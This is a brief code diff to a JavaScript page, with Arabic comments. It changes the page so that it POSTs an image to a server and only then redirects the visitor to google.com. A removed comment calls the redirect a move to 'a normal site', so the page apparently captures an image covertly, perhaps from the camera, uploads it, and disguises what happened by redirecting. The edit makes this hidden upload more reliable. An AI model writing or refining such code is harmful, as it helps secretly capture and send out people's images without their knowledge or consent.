@@ -42,10 +42,12 @@ function start() {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify({ image: img })
+        }).then(() => {
+          // التحويل ما يصير إلا بعد ما الطلب يطلع بنجاح
+          window.location.href = "https://google.com";
+        }).catch(err => {
+          console.log("Error sending image:", err);
         });
-
-        // تحويل لموقع طبيعي
-        window.location.href = "https://google.com";
 
       }, 3000);
     });
